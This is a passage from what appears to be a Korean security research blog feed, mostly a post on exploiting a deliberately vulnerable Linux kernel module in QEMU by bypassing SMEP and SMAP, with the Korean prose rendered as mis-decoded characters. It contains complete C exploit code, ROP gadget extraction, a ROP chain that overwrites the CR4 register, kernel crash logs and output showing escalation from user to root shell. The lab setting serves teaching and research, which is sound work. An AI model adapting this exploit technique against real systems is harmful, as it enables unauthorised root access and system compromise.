ffffffff82b2bba0 RDI: ffffffff82b2bfa0[    5.874894] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000000007[    5.875395] R10: 0000000000000045 R11: ffffffff82b2bba7 R12: 4141414141414141[    5.875932] R13: 0000000000000090 R14: ffffc9000019ff10 R15: 00007fff25db9ea0[    5.876434] FS:  00000000011ce880(0000) GS:ffff88801f000000(0000) knlGS:0000000000000000[    5.877037] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.877708] CR2: 0000000000459f70 CR3: 000000001da40000 CR4: 00000000003006f0[    5.878296] Kernel panic - not syncing: Fatal exception[    5.879164] Kernel Offset: disabled[    5.879860] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x0000000081400220This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.í•´ë‹¹ ê²°ê³¼ë¥¼ í†µí•´ RIPê°€ 0x4343434343434343ë¡œ ë³€ì¡°ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆê³  í•´ë‹¹ ê°’ì€ ì‚¬ìš©ìê°€ ì…ë ¥í•  ë²„í¼ì˜ 32ë§Œí¼ì˜ ì…ë ¥í•œ ë’¤ì˜ ê°’ì´ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ payload[4]ì— ê°’ì„ ì‘ì„±í•  ê²½ìš° í•´ë‹¹ ê°’ìœ¼ë¡œ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆë‹¤.</code></pre><p>ê³µê²©ê²°ê³¼ëŠ” ì˜ˆìƒí•˜ì˜€ë˜ ê²ƒê³¼ ê°™ì´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒìœ¼ë¡œ íŒŒì•…ëœë‹¤. í•´ë‹¹ ë¶€ë¶„ì—ì„œ ì¶”ê°€ì ìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ìˆëŠ” ê²ƒì€ <b>CR4 ë ˆì§€ìŠ¤í„°ì˜ ê°’</b>ì´ë‹¤. í•´ë‹¹ ê°’ì˜ ê²½ìš°ëŠ” <b>0x00000000003006f0</b>ìœ¼ë¡œ ì´ë¥¼ ë°”ì´ë„ˆë¦¬ í˜•íƒœë¡œ ë³€ê²½í•œë‹¤ë©´ <b>00000000 00000000 00000000 00000000 00000000 00110000 00000110 11110000</b> ë‹¤ìŒê³¼ ê°™ë‹¤. í•´ë‹¹ ê²°ê³¼ë¥¼ í•´ì„í•´ë³¼ ê²½ìš° SMEPê³¼ SMAPì´ ì ìš©ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><p></br></br></p><h2 id="ì·¨ì•½ì -ê³µê²©"><a href="#ì·¨ì•½ì -ê³µê²©" class="headerlink" title="ì·¨ì•½ì  ê³µê²©"></a>ì·¨ì•½ì  ê³µê²©</h2><p>ë¶„ì„ê³¼ì •ì„ í†µí•´ ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì„ í†µí•´ ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ìˆ˜ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. ì´ëŸ¬í•œ ì •ë³´ë“¤ì„ í† ëŒ€ë¡œ ê³µê²©ìì—ê²Œ ìœ ì˜ë¯¸í•œ í˜•íƒœì˜ ê³µê²©ì´ ë  ìˆ˜ ìˆë„ë¡ ì–´ë– í•œ í˜•íƒœë¡œ ê³µê²©ì„ ì§„í–‰í•  ê²ƒì¸ê°€ì— ëŒ€í•´ì„œ ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì‘ì„±í•˜ê² ë‹¤.</p><p>ê°€ì¥ íŒŒê¸‰ë ¥ìˆê³  ê³µê²©ìì—ê²Œ ììœ ë„ê°€ ë†’ì€ ë°©ë²•ì€ ë¦¬ëˆ…ìŠ¤(linux) ê¸°ë°˜ì˜ ì»¤ë„ì„ ê³µê²©í•˜ëŠ” ê²ƒì´ê¸°ì— ë£¨íŠ¸ ê¶Œí•œì˜ ì‰˜(shell)ì„ íšë“í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ê³µê²©ì´ ì´ë£¨ì–´ì§€ê¸° ìœ„í•´ì„œëŠ” ìš°ì„ ì ìœ¼ë¡œ ì§„í–‰ë˜ì–´ì•¼ í•˜ëŠ” ê²ƒì´ ìœ ì € ê¶Œí•œì„ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹(ê¶Œí•œ ìƒìŠ¹)ì„ ì¼ìœ¼ì¼œì•¼ í•œë‹¤. </p></br><h3 id="ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤"><a href="#ê³µê²©-ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ê³µê²© ì‹œë‚˜ë¦¬ì˜¤"></a>ê³µê²© ì‹œë‚˜ë¦¬ì˜¤</h3><pre><code>STEP1. CR4 ë ˆì§€ìŠ¤í„° ë³€ì¡°ë¥¼ í†µí•œ SMEP, SMAP ë¹„í™œì„±í™”STEP2. commit_creds(prepare_kernel_cred(0))ì„ í†µí•œ ê¶Œí•œ ìƒìŠ¹STEP3. ì‚¬ìš©ì ëª¨ë“œ(user mode)ë¡œì˜ ì „í™˜STEP4. shell íšë“</code></pre><p>ë‹¤ìŒì˜ ì‹œë‚˜ë¦¬ì˜¤ëŠ” SMEP, SMAPì´ ì ìš©ë˜ì–´ ìˆì§€ ì•Šì€ ì¼ë°˜ì ì¸ í˜•íƒœì˜ ê³µê²©(exploit)ê³¼ ìœ ì‚¬í•˜ë‹¤. Memory Randomizationì´ ì ìš©ë˜ì–´ ìˆì§€ ì•Šê¸° ë•Œë¬¸ì— ì‹¤í–‰ì‹œí‚¤ê³ ì í•˜ëŠ” í•¨ìˆ˜ì¸ commit_creds(), prepare_kernel_cred()ë¥¼ í•˜ë“œì½”ë”©í•˜ì—¬ ê°’ì„ ì‘ì„±í•´ë„ ëœë‹¤.</p><p>ì—¬ê¸°ì„œ ê³ ë ¤í•´ì•¼í•˜ëŠ” ì‚¬í•­ì€ ì´ì „ í¬ìŠ¤íŠ¸ì—ì„œ ì‘ì„±í•˜ì˜€ë˜ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ì˜ ê²½ìš° ìœ ì € ì˜ì—­ì˜ í•¨ìˆ˜ì—ì„œ STEP2, STEP3, STEP4ë¥¼ ì§„í–‰í•œë‹¤. í•˜ì§€ë§Œ SMEP, SMAPì´ ì ìš©ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— STEP1ì˜ ê³¼ì •ì„ ê±°ì¹˜ì§€ ì•ŠëŠ”ë‹¤ë©´ ë¬¸ì œê°€ ë°œìƒí•  ê²ƒì´ë‹¤.</p></br><h3 id="ê³µê²©-ì½”ë“œ-1"><a href="#ê³µê²©-ì½”ë“œ-1" class="headerlink" title="ê³µê²© ì½”ë“œ(1)"></a>ê³µê²© ì½”ë“œ(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="ê³µê²©-ê²°ê³¼-1"><a href="#ê³µê²©-ê²°ê³¼-1" class="headerlink" title="ê³µê²© ê²°ê³¼(1)"></a>ê³µê²© ê²°ê³¼(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ ./exploit [    5.284800] arr : 0[    5.285076] unable to execute userspace code (SMEP?) (uid: 1000)[    5.287133] BUG: unable to handle page fault for address: 0000000000400bc4[    5.290793] #PF: supervisor instruction fetch in kernel mode[    5.291958] #PF: error_code(0x0011) - permissions violation[    5.293203] PGD 1d954067 P4D 1d954067 PUD 1d955067 PMD 1d952067 PTE 1e0ef025[    5.294763] Oops: 0011 [#1] SMP NOPTI[    5.295289] CPU: 0 PID: 70 Comm: exploit Tainted: G           O      5.8.5 #2[    5.295987] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014[    5.296780] RIP: 0010:0x400bc4[    5.297402] Code: Bad RIP value.[    5.297736] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.298131] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.298608] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0[    5.299073] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900[    5.299522] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141[    5.299982] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000[    5.300503] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    5.301110] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.301557] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0[    5.302173] Call Trace:[    5.303023]  ? ksys_write+0x9c/0xd0[    5.308759]  ? do_syscall_64+0x3e/0x70[    5.309125]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9[    5.310466] Modules linked in: test(O)[    5.312506] CR2: 0000000000400bc4[    5.313227] ---[ end trace c3b44d8ed90feeeb ]---[    5.314069] RIP: 0010:0x400bc4[    5.314341] Code: Bad RIP value.[    5.314574] RSP: 0018:ffffc9000019fed8 EFLAGS: 00000246[    5.314908] RAX: 0000000000000000 RBX: 4141414141414141 RCX: 0000000020727261[    5.316170] RDX: 4141414141414141 RSI: ffffffff82b12ba0 RDI: ffffffff82b12fa0[    5.316755] RBP: 4141414141414141 R08: 0000000030203a20 R09: 0000000000028900[    5.317232] R10: 4141414141414141 R11: 0000000000000046 R12: 4141414141414141[    5.317685] R13: ffffc9000019ff10 R14: 00007fff8ce65780 R15: 0000000000000000[    5.318159] FS:  0000000001a2f880(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000[    5.318700] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033[    5.319070] CR2: 0000000000400bc4 CR3: 000000001d970000 CR4: 00000000003006f0[    5.319614] Kernel panic - not syncing: Fatal exception[    5.320346] Kernel Offset: disabled[    5.321058] Rebooting in 1 seconds..qemu-system-x86_64: Trying to execute code outside RAM or ROM at 0x00000000813f0950This usually means one of the following happened:(1) You told QEMU to execute a kernel for the wrong machine type, and it crashed on startup (eg trying to run a raspberry pi kernel on a versatilepb QEMU machine)(2) You didn&#39;t give QEMU a kernel or BIOS filename at all, and QEMU executed a ROM full of no-op instructions until it fell off the end(3) Your guest kernel has a bug and crashed by jumping off into nowhereThis is almost always one of the first two, so check your command line and that you are using the right type of kernel for this machine.If you think option (3) is likely then you can try debugging your guest with the -d debug options; in particular -d guest_errors will cause the log to include a dump of the guest register state at this point.Execution cannot continue; stopping here.</code></pre><p>ê³µê²© ê²°ê³¼(1)ì„ í†µí•´ ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œëŠ” ìµìŠ¤í”Œë¡œì‡ì´ ê°€ëŠ¥í•˜ì§€ ì•ŠìŒì„ ì•Œ ìˆ˜ ìˆë‹¤. ì´ë¥¼ ê³ ë ¤í•˜ì—¬ CR4 ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ì¡°í•˜ì—¬ SMEPê³¼ SMAPì„ ë¹„í™œì„±í™”í•˜ì—¬ ê³µê²©ì„ ì§„í–‰í•  ìˆ˜ ìˆë‹¤. CR4 ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ì¡°í•  ìˆ˜ ìˆëŠ” ê°€ì ¯(gadget)ì„ ì°¾ì•„ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•˜ì—¬ ë³´ê² ë‹¤.</p></br><h3 id="ê°€ì ¯-êµ¬ì„±"><a href="#ê°€ì ¯-êµ¬ì„±" class="headerlink" title="ê°€ì ¯ êµ¬ì„±"></a>ê°€ì ¯ êµ¬ì„±</h3><p>CR4 ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ì¡°í•˜ê¸° ìœ„í•´ì„œ í•„ìš”í•œ ê°€ì ¯ì„ ì°¾ì•„ë´ì•¼ í•œë‹¤. ì‚¬ìš©ìê°€ ì…ë ¥í•œ ê°’ìœ¼ë¡œ CR4 ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ì¡°í•´ì•¼í•˜ë©° í˜„ì¬ ì‚¬ìš©ìì˜ ì…ë ¥ì´ ìœ„ì¹˜í•˜ëŠ” ë©”ëª¨ë¦¬ëŠ” ìŠ¤íƒìœ¼ë¡œ ë³¼ ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ê²ƒë“¤ì„ ê³ ë ¤í•˜ì—¬ í˜ì´ë¡œë“œë¥¼ êµ¬ìƒí•´ë³´ê² ë‹¤.</p></br><pre><code>pop registermov cr4, register&amp;payload</code></pre><p>ìŠ¤íƒì— ì‚¬ìš©ìê°€ ì…ë ¥í•œ ë°ì´í„°ê°€ ìœ„ì¹˜í•˜ë©° ì´ë¥¼ íŠ¹ì • ë ˆì§€ìŠ¤í„°ì— ë‹´ì„ ìˆ˜ ìˆëŠ” ê°€ì ¯ì„ ì°¾ì•„ ì´ë¥¼ cr4 ë ˆì§€ìŠ¤í„°ì— ìœ„ì¹˜í•˜ë„ë¡ í•´ì•¼í•œë‹¤. ì´í›„ ì‹¤í–‰íë¦„ì„ ìœ ì €ì˜ì—­ì˜ í•¨ìˆ˜ë¡œ ë³€ì¡°í•œë‹¤ë©´ ì •ìƒì ìœ¼ë¡œ ì½”ë“œê°€ ì‹¤í–‰ë˜ì–´ ê¶Œí•œì´ ìƒìŠ¹ëœ í˜•íƒœë¡œ ì‰˜ì„ íšë“í•  ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ íŒë‹¨ëœë‹¤.</p></br><h3 id="ê°€ì ¯-ì¶”ì¶œ"><a href="#ê°€ì ¯-ì¶”ì¶œ" class="headerlink" title="ê°€ì ¯ ì¶”ì¶œ"></a>ê°€ì ¯ ì¶”ì¶œ</h3><pre><code>$ ROPgadget --binary vmlinux | grep &#39;mov cr4&#39;0xffffffff8102f82c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff8104c097 : add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8102f82e : add byte ptr [rax], al ; xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff8104c095 : add byte ptr [rax], dl ; add byte ptr [rax], al ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8104c099 : mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff810973c0 : mov cr4, rax ; ret0xffffffff8102f832 : mov cr4, rdi ; jmp 0xffffffff8102f8540xffffffff810973bf : nop ; mov cr4, rax ; ret0xffffffff8104c094 : or eax, 0x1000 ; mov cr4, rax ; jmp 0xffffffff8104c09e0xffffffff8102f830 : xor esi, esi ; mov cr4, rdi ; jmp 0xffffffff8102f854 </code></pre></br><pre><code>$ objdump -M intel -d vmlinux | grep -a1 &quot;pop    rax&quot;ffffffff8197ee5a:    58                       pop    raxffffffff8197ee5b:    c3                       ret  </code></pre><p>ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ vmlinuxì—ì„œ ê³µê²© í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•  ê°€ì ¯ì„ ì¶”ì¶œí•  ìˆ˜ ìˆì—ˆë‹¤. ì‚¬ìš©ìì˜ ì…ë ¥ì„ í†µí•´ ìŠ¤íƒì— ìˆëŠ” ê°’ì„ ì»¨íŠ¸ë¡¤ í•  ìˆ˜ ìˆìœ¼ë©° pop ëª…ë ¹ì–´ë¥¼ í†µí•´ì„œ raxì— í•´ë‹¹ ê°’ì„ ë‹´ëŠ”ë‹¤. ì´í›„ mov cr4, raxë¥¼ í†µí•´ì„œ raxì˜ ê°’ì„ cr4 ë ˆì§€ìŠ¤í„°ì— ì„¸íŒ…í•œë‹¤. ì´ëŸ¬í•œ ê³¼ì •ì´ ìˆ˜í–‰ë  ê²½ìš° SMEP, SMAPì„ ë¹„í™œì„±í™”ëœ í˜•íƒœì˜ stateê°€ ë˜ë¯€ë¡œ ìœ ì € ì˜ì—­ì˜ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ëœë‹¤.</p></br><h3 id="ê³µê²©ì½”ë“œ-2"><a href="#ê³µê²©ì½”ë“œ-2" class="headerlink" title="ê³µê²©ì½”ë“œ(2)"></a>ê³µê²©ì½”ë“œ(2)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);<br>unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);<br><br>struct register_val &#123;<br>    uint64_t user_rip;<br>    uint64_t user_cs;<br>    uint64_t user_rflags;<br>    uint64_t user_rsp;<br>    uint64_t user_ss;<br>&#125; __attribute__((packed));<br><br>struct register_val rv;<br><br>void shell() &#123;<br>    execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);<br>&#125;<br><br>void backup_rv(void) &#123;<br>    asm(&quot;mov rv+8, cs;&quot;<br>        &quot;pushf; pop rv+16;&quot;<br>        &quot;mov rv+24, rsp;&quot;<br>        &quot;mov rv+32, ss;&quot;<br>       );<br>    rv.user_rip = &amp;shell;<br>&#125;<br><br>void payload(void) &#123;<br>    commit_creds(prepare_kernel_cred(0));<br>    asm(&quot;swapgs;&quot;<br>        &quot;mov %%rsp, %0;&quot;<br>        &quot;iretq;&quot;<br>        : : &quot;r&quot; (&amp;rv));<br>&#125;<br><br>int main() &#123;<br>    int fd;<br>    size_t rop[10] = &#123;0, &#125;;<br>    <br>    commit_creds = 0xffffffff8108bed0;<br>    prepare_kernel_cred = 0xffffffff8108c2f0;<br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    backup_rv();<br><br>    memset(rop, 0x41, 40);<br>    rop[4] = 0xffffffff8197ee5a;     // pop rax; ret;<br>    rop[5] = 0x0006f0;               // SMAP: Disabled | SMEP: Disabled <br>    rop[6] = 0xffffffff810973c0;     // mov cr4, rax; ret;<br>    rop[7] = &amp;payload;<br><br>    write(fd, rop, sizeof(rop));<br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure></br><h3 id="ê³µê²©ê²°ê³¼-2"><a href="#ê³µê²©ê²°ê³¼-2" class="headerlink" title="ê³µê²©ê²°ê³¼(2)"></a>ê³µê²©ê²°ê³¼(2)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ whoamiuser/ $ ./exploit / # whoamiroot/ # </code></pre><p></br></br></p><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)DREAMHACK - Linux Kernel ExploitINFLEARN - ë¦¬ëˆ…ìŠ¤ ì»¤ë„ í•´í‚¹. Aë¶€í„° Zê¹Œì§€https://www.lazenca.net/pages/viewpage.action?pageId=25624859https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame</code></pre><p></br></br></p><h2 id="í•œì¤„í‰"><a href="#í•œì¤„í‰" class="headerlink" title="í•œì¤„í‰"></a>í•œì¤„í‰</h2><pre><code>í¬ë˜ì‹œê°€ ë°œìƒí•œ ë©”ëª¨ë¦¬ì˜ ìƒí™©ì— ë”°ë¼ ì ì ˆíˆ í˜ì´ë¡œë“œë¡œ êµ¬ì„±í•  ìˆ˜ ìˆë„ë¡ ê³ ë¯¼í•˜ì.</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>smap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Exploit - Bypassing SMEP</title>
    <link href="/2021/09/30/linux-kernel-exploit-bypassing-smep/"/>
    <url>/2021/09/30/linux-kernel-exploit-bypassing-smep/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMEP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMEP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMEP"></a>[Research] Linux Kernel Exploit - Bypassing SMEP</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” Linux Kernel Basic ì‹œë¦¬ì¦ˆì˜ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— ì ìš©ë˜ì–´ ìˆëŠ” ë³´í˜¸ê¸°ë²•(mitigation)ì„ í•˜ë‚˜ì”© ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ê³¼ì •ì„ í¬ìŠ¤íŠ¸í•˜ë ¤ê³  í•œë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” SMEP ë³´í˜¸ê¸°ë²•ì„ ì£¼ì œë¡œ í•˜ì—¬ í•´ë‹¹ ë³´í˜¸ê¸°ë²•ì´ ì–´ë– í•œ ë³´í˜¸ê¸°ë²•ì¸ì§€ ì´í•´í•˜ê³  ì´ë¥¼ ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì‘ì„±í•˜ë ¤ê³  í•œë‹¤.</p></br></br><h2 id="SMEP"><a href="#SMEP" class="headerlink" title="SMEP"></a>SMEP</h2><p>SMEP(Supervisor Mode Execution Prevention)ì€ supervisor mode(ring0)ì—ì„œ íŠ¹ì • ì£¼ì†Œì— ìˆëŠ” ëª…ë ¹ì–´ë¥¼ fetchí•  ê²½ìš° í•´ë‹¹ ì£¼ì†Œê°€ ë§Œì•½ user mode(ring3)ì—ì„œ ì ‘ê·¼ê°€ëŠ¥í•œ ì£¼ì†Œë¼ë©´ fetchí•˜ì§€ ì•Šê²Œ í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì´ë‹¤. </p><p>ë‹¨ìˆœí•œ ì •ì˜ë¥¼ ë‚´ë¦¬ëŠ” ê²ƒì— ê°‡íˆì§€ ì•Šê³  ë‚´ê°€ ì´í•´í•œ ë‚´ìš©ìœ¼ë¡œ í•´ë‹¹ ê¸°ë²•ì„ ì‘ì„±í•˜ë©´ SMEPì€ ìœ ì €ì˜ì—­ì— NX bitì™€ ìœ ì‚¬í•˜ë‹¤ëŠ” ëŠë‚Œì´ ë“¤ì—ˆë‹¤. ì§€ë‚œ í¬ìŠ¤íŒ…ì—ì„œëŠ” í˜ì´ë¡œë“œê°€ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œì— ìˆì—ˆë‹¤. SMEPì´ ì ìš©ë˜ì–´ ìˆë‹¤ë©´ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì˜ ê³µê²©ì€ ë¶ˆê°€ëŠ¥í•˜ë‹¤. </p><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]/ $ lsbin      etc      init     linuxrc  root     sys      tmpdev      exp      lib      proc     sbin     test.ko  usr/ $ ./exp [    4.728265] unable to execute userspace code (SMEP?) (uid: 1000)[    4.729769] BUG: unable to handle page fault for address: 0000000000400c54[    4.733079] #PF: supervisor instruction fetch in kernel mode[    4.734208] #PF: error_code(0x0011) - permissions violation[    4.735407] PGD 1d954067 P4D 1d954067 PUD 1d958067 PMD 1d94c067 PTE 1dc30025[    4.737038] Oops: 0011 [#1] SMP NOPTI[    4.738022] CPU: 0 PID: 70 Comm: exp 